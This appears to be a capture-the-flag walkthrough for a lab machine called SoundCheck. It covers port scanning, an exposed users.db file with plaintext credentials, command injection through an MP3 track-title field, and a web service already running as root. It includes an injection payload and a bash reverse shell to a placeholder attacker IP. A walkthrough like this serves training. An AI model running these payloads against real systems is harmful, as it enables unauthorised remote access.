# SoundCheck: Official Walkthrough

This guide details the complete exploitation path for the SoundCheck machine.

## Phase 1: Reconnaissance
1. Begin by performing a comprehensive port scan against the target IP address:
   ```bash
   nmap -sC -sV -p- <TARGET_IP>
   ```
2. The scan will reveal a standard web server running on port `80` (a public marketing site) and an administrative panel running on a non-standard port `8000`.
3. Navigate to `http://<TARGET_IP>:8000` to find the SoundCheck Staff Portal login page.

## Phase 2: Information Disclosure
1. The login page requires valid staff credentials. Run a directory enumeration tool (like `gobuster` or `dirb`) against port `8000`:
   ```bash
   gobuster dir -u http://<TARGET_IP>:8000/ -w /path/to/wordlist.txt
   ```
2. You will discover an exposed database file named `users.db` located in the web root.
3. Navigate to `http://<TARGET_IP>:8000/users.db` (or `curl` the file) to read its contents.
4. Extract the plaintext credentials found in the file.

## Phase 3: Command Injection (Initial Access)
1. Return to the Staff Portal (`http://<TARGET_IP>:8000/login.php`) and log in using the credentials you recovered.
2. Once logged in, you will access a dashboard that allows users to upload a new MP3 track and assign it a "Track Title".
3. The application uses `ffmpeg` to process the uploaded MP3 and insecurely parses the "Track Title" metadata field directly into a system shell command.
4. Prepare any valid `.mp3` file to satisfy the file upload requirement.
5. In the "Track Title" input field, append a command separator followed by your payload. For example, to test execution:
   ```bash
   ; ping -c 4 <YOUR_IP> ;
   ```
6. To gain an interactive shell, set up a netcat listener on your attacking machine (`nc -lvnp 4444`) and inject a reverse shell payload into the title field:
   ```bash
   ; bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' ;
   ```
7. Click "Sync to PA System" to upload the file. The injected payload will execute, and you will receive a reverse shell connection.
8. Read the user flag located in the web application directory.

## Phase 4: Privilege Escalation
1. Within your newly acquired reverse shell, check your current user privileges:
   ```bash
   whoami
   id
   ```
2. You will immediately notice that you are operating as the `root` user. The backend web service handling the uploads was lazily misconfigured to run with high system privileges to interact with the internal PA system.
3. No complex privilege escalation is required. Simply navigate to the administrator's home directory and read the root flag to complete the machine.
